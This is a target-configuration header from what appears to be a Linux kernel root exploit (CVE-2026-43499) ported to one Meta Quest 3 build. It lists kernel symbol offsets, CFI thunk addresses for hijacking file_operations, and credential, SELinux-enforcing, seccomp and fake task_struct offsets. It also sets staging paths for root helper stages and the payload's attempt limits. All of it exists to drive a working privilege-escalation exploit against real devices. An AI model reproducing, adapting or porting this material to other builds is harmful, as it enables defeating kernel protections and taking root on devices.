/*
 * quest3 / GLOBAL / 5.10.240-gce8cca212ac5
 * Meta Quest 3 (eureka), Horizon OS build 52345320027600520,
 * Qualcomm SXR2230P (anorak), VA_BITS=39, 4K pages.
 *
 * The block below is copied verbatim from the port that produced it --
 * IonStackQuest3's src/targets/eureka-52345320027600520/target.h, written
 * for this exact build. Do not hand-edit a number inside it; regenerate
 * there and copy again. What produced it:
 *
 *   vmlinux-to-elf --base-address 0xFFFFFFC008000000 kernel kernel-206.elf
 *   python3 gen_ionstack_config.py kernel-206.elf ionstack-206.conf
 *
 * run against this build's own boot.img. The symbol offsets were
 * cross-checked against an independent kallsyms/BTF/disassembly derivation
 * of the same image and the twelve symbols present in both agree exactly;
 * every struct-member offset was re-verified against this build's own BTF,
 * 51 of 51. The function-pointer offsets are .cfi_jt thunks rather than the
 * functions themselves, which is what a hijacked fops entry needs on a CFI
 * kernel -- that is why they differ from a plain symbol table.
 *
 * Two things in it are NOT measured from this build, and both are called out
 * in the comments where they sit:
 *
 *   P0_KERNEL_PHYS_LOAD  cannot be read out of the image at all (no
 *                        /memorymap in xbl_config, and vendor_boot's /memory
 *                        is a <0 0> placeholder UEFI fills at runtime). The
 *                        value here is upstream's, which is empirical on this
 *                        device family but not on this build.
 *   the static P0_PHYS_OFFSET
 *                        docs/PORTING.md section 4 asks for the
 *                        memstart_offset_seed randomisation to be shown
 *                        skipped before a compiled-in physical offset is
 *                        trusted. At VA_BITS=39 the guard ahead of that shift
 *                        is the same one that makes both MediaTek targets
 *                        here safe, but it has not been confirmed by
 *                        disassembly on this kernel.
 *
 * Nothing in this file has been checked against the device it describes: no
 * run of this payload has reached root on THIS build, and the device it was
 * written for OTA'd off it mid-port. The successor build is reached by
 * quest3/global/5.10.240-g55be3759aea4, which a run did reach root on -- the
 * two share .text/.data/.bss and differ only in .rodata. This file is kept
 * because someone may still be on this build, not because it is untested by
 * accident. See src/targets.json.
 */
#ifndef TARGET_QUEST3_5_10_240_CORE510_H
#define TARGET_QUEST3_5_10_240_CORE510_H

/* --- begin generated (IonStackQuest3 gen_ionstack_config.py + its BTF/
 *     disassembly derivation; see the header comment) ------------------- */

#define BUILD_VARIANT_LABEL "eureka_q3_52345320027600520"
#define BUILD_FINGERPRINT "google/eureka/eureka:17/RELEASE/52345320027600520:user/release-keys"

#define KIMAGE_TEXT_BASE_DEFAULT 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
/*
 * The one constant here that is NOT measured from this build.
 *
 * It is the physical address the bootloader loads _text at. It cannot be
 * read out of the image: Quest 3's xbl_config carries no /memorymap node
 * and the vendor_boot /memory node is a <0 0> placeholder UEFI fills at
 * runtime. It is load-bearing and it is used FIRST: the boot_id slide
 * write goes through P0_DATA_ALIAS_CONST(), whose whole point is that the
 * linear-map alias does not move with KASLR.
 *
 * 0xA8000000 is upstream's value, and upstream reports a working root on
 * this device family -- that is empirical support, which is why it is the
 * default. It does conflict with an ABL-derived candidate of 0x8E780000
 * (Quest3-root/QUEST3_PORT.md section 7, from LinuxLoader.efi rva 0x19950
 * computing KernelLoadAddr = BaseMemory | 0x00080000). That derivation
 * assumes an SMEM RAM-partition base coincides with a device-tree
 * reserved-memory hole, which is unproven, so it does not outweigh a
 * value that has actually run.
 *
 * Overridable without editing this file, for trying the alternates:
 *   make PROJECT=eureka-52345320027600520 \
 *        EXTRA_CFLAGS=-DP0_KERNEL_PHYS_LOAD=0x8E780000ULL
 * Other candidates from the same intersection: 0xC6B80000, 0xDC780000.
 * A wrong value shows up immediately as "slide kaslr leak failed".
 */
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0xA8000000ULL
#endif
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xFFFFFFC000000000ULL
#define VMEMMAP_START 0xFFFFFFFEFFE00000ULL

/* Function pointers are .cfi_jt thunk addresses, not the functions
 * themselves -- this kernel is built with CFI, so a hijacked fops entry
 * must point at the jump-table entry or __cfi_slowpath kills it. */
#define RANDOM_MISC_FOPS_OFF 0x01e916f8ULL
#define ASHMEM_MISC_FOPS_OFF 0x02819688ULL //ashmem_misc + 0x10 (miscdevice.fops)
#define ASHMEM_FOPS_OFF 0x01ec8a30ULL
#define ASHMEM_IOCTL_OFF 0x0143a050ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0143a058ULL
#define ASHMEM_MMAP_OFF 0x01425470ULL
#define ASHMEM_OPEN_OFF 0x01434ff8ULL
#define ASHMEM_RELEASE_OFF 0x01435000ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x014255e8ULL
#define ASHMEM_READ_ITER_OFF 0x01425370ULL
#define CONFIGFS_READ_FILE_OFF 0x01434088ULL
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x01434458ULL
#define COPY_SPLICE_READ_OFF 0x01425558ULL
#define NOOP_LLSEEK_OFF 0x01422758ULL

// #define ASHMEM_IOCTL_OFF 0x00defbecULL
// #define ASHMEM_COMPAT_IOCTL_OFF 0x00df004cULL
// #define ASHMEM_MMAP_OFF 0x00df00acULL
// #define ASHMEM_OPEN_OFF 0x00df02f4ULL
// #define ASHMEM_RELEASE_OFF 0x00df0394ULL
// #define ASHMEM_SHOW_FDINFO_OFF 0x00df0428ULL
// #define ASHMEM_READ_ITER_OFF 0xdefb08ULL
// #define CONFIGFS_READ_FILE_OFF 0x005ebc24ULL
// #define CONFIGFS_WRITE_BIN_FILE_OFF 0x005ec678ULL
// #define COPY_SPLICE_READ_OFF 0x00547638ULL
// #define NOOP_LLSEEK_OFF 0x004eaf60ULL
// OK
#define INIT_TASK_OFF 0x027ec200ULL
#define INIT_UTS_NS_OFF 0x02839968ULL
#define EMPTY_ZERO_PAGE_OFF 0x028ec000ULL
// OK
#define ROOT_TASK_GROUP_OFF 0x028f0700ULL
#define SELINUX_BLOB_SIZES_OFF 0x01f05030ULL
// selinux_state (BTF: selinux_state.enforcing is at +0x0)
#define SELINUX_ENFORCING_OFF 0x02942198ULL
#define SECURITY_HOOK_HEADS_OFF 0x01f02c50ULL
#define KMALLOC_CACHES_OFF 0x01f05a70ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01db0f68ULL

#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
// OK
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x27e6478ULL // ->p_sysctl_bootid 0xFFFFFFC00A7E6478 - KIMAGE_TEXT_BASE
// OK
#define SLIDE_SYSCTL_BOOTID_OFF 0x02a4f1d9ULL //sysctl_bootid
// OK
#define SLIDE_LOGGERS_0_1_OFF 0x26eed80ULL //loggers+8
// OK
#define SLIDE_NFULNL_LOGGER_OFF 0x026eee50ULL //nfulnl_logger

// PAGES
#define LOCK_OFF 0x1000
#define FOPS_OFF 0x2000

#define W0_OFF 0x2400
#define FAKE_TASK_OFF 0x3000

// struct rt_mutex_waiter OK-SRC？ can be obtained from rt_mutex_enqueue_pi
// #define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18 //OK rt_mutex_enqueue_pi
#define WAITER_TASK_OFF 0x30 //OK task_blocks_on_rt_mutex
#define WAITER_LOCK_OFF 0x38 //OK task_blocks_on_rt_mutex
#define WAITER_PRIO_OFF 0x40 // OK task_blocks_on_rt_mutex: waiter+0x40 = task->prio (5.10 has no wake_state, prio at 0x40)
#define WAITER_DEADLINE_OFF 0x48 //OK task_blocks_on_rt_mutex

// 5系内核没有
// #define FAKE_WAITER_TREE_PRIO_OFF 0x18
// #define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
// #define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
// #define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
// #define FAKE_WAITER_WAKE_STATE_OFF 0x60
// #define FAKE_WAITER_WW_CTX_OFF 0x68

#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_TASK_OFF WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF WAITER_LOCK_OFF
#define FAKE_WAITER_DEADLINE_OFF WAITER_DEADLINE_OFF

// 原版这里是一一对应的
#define FAKE_TASK_USAGE_OFF 0x38 //0x40->0x38 _put_task_struct
#define FAKE_TASK_PRIO_OFF 0x94 //0x84->0x94 from normal_prio
#define FAKE_TASK_NORMAL_PRIO_OFF 0x9c //8c->9c? enqueue_task_dl
#define FAKE_TASK_TASK_GROUP_OFF 0x310 //0x310 !!!! sched_change_group
#define FAKE_TASK_PI_LOCK_OFF 0x854 //0x854 ,from rt_mutex_adjust_pi
#define FAKE_TASK_PI_WAITERS_OFF 0x868 //0x868 from rt_mutex_enqueue_pi
#define FAKE_TASK_PI_TOP_TASK_OFF 0x878 //0x878 pi_top_task rt_mutex_setprio
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x880 //0x880 0x878+0x8
// configfs
//!!! 中间这一部分还得分析
// from source
// configfs_buffer
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100


// PIPE
#define TASK_PID_OFF 0x5C0 //trace_save_cmdline
// ROOT
#define TASK_TGID_OFF 0x5C4 //pid +4
// ?
#define TASK_REAL_PARENT_OFF 0x5D0  // do_notify_parent_cldstop
#define TASK_ATOMIC_FLAGS_OFF 0x588 // cpuset_update_task_spread_flag
#define TASK_REAL_CRED_OFF 0x770 // exit_creds
#define TASK_CRED_OFF 0x778 // exit_creds
#define TASK_COMM_OFF 0x788 // trace_save_cmdline
#define TASK_TASKS_OFF 0x4C0 //_unhash_process
// ??? What's this?
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
// ??? 
#define TASK_SECCOMP_OFF 0x830 //seccomp_filter_release filters - 8
// from source
#define CRED_UID_OFF 0x4
#define CRED_SECUREBITS_OFF 0x24
#define CRED_CAPS_OFF 0x28
#define CRED_SECURITY_OFF 0x78
#define CRED_USER_OFF 0x80

#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
// OK
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
// OK

#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0
#define STRUCT_PAGE_SIZE 0x40 //_populate_section_memmap
// OK 
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30 //validate_page_before_insert
// OK

#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10


// NOT USED
// #define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
// #define PIPE_INODE_INFO_SIZE 0xc0
// #define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
// #define PIPE_HEAD_OFF 0x60
// #define PIPE_TAIL_OFF 0x64
// #define PIPE_MAX_USAGE_OFF 0x68
// #define PIPE_RING_SIZE_OFF 0x6c
// #define PIPE_NR_ACCOUNTED_OFF 0x70
// #define PIPE_READERS_OFF 0x74
// #define PIPE_WRITERS_OFF 0x78
// #define PIPE_FILES_OFF 0x7c
// #define PIPE_TMP_PAGE_OFF 0x90
// #define PIPE_BUFS_OFF 0xa8
// #define PIPE_USER_OFF 0xb0
// #define MM_OWNER_OFF 1032
// !! 到上面的部分都得验证一下


// FOP验证过了
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

/* --- end generated ------------------------------------------------------- */

/* Where core510/root.c looks for the bootstrap helper when the payload was not
 * launched by the application. The app build overrides it: the helper it ships
 * inside its APK cannot be at a fixed path, so it passes the real one in
 * CVE43499_ROOT_HELPER. */
#define ROOT_HELPER_PATH "/data/local/tmp/cve-2026-43499-root"

/* Where core510/root.c looks for the 32-bit stage before copying it to the
 * path api.c execs (EXP32_LOCAL, core510/common.h). Both are /data/local/tmp
 * here, which is what an adb shell run can write; an application-launched run
 * can write neither, and that is the open end of this port rather than
 * something this file can answer. CVE43499_EXP32 overrides the source at run
 * time; EXP32_LOCAL would have to be defined here to move the exec side. */
#define EXP32_STAGED_PATH "/data/local/tmp/cve-2026-43499-exp32"

/* One attempt. Nothing here has run on hardware, and upstream's own README
 * says a failed run can hang the device until the power button is held and
 * that the first run after a boot is the one most likely to work -- so a
 * second attempt would be entered against a kernel a hang has already been
 * observed to leave behind, on a device where the cost of being wrong is a
 * forced reboot rather than a retry. Raise it only after a retry has been
 * watched to be safe here. EXPLOIT_ATTEMPTS still overrides at run time. */
#define PAYLOAD_ATTEMPT_BUDGET 1

/* The supervisor's SIGKILL. A healthy run is not quick: the KASLR leak is a
 * perf-callchain histogram over three million getpid() calls, the stack stamp
 * is a race the 32-bit stage re-enters up to ten million times, and the fops
 * setup retries. Sized above what a healthy run takes, because a budget below
 * it does not detect a hang, it manufactures one -- and the kill lands
 * wherever the attempt happens to be. */
#define PAYLOAD_ATTEMPT_TIMEOUT_SEC 600

#endif
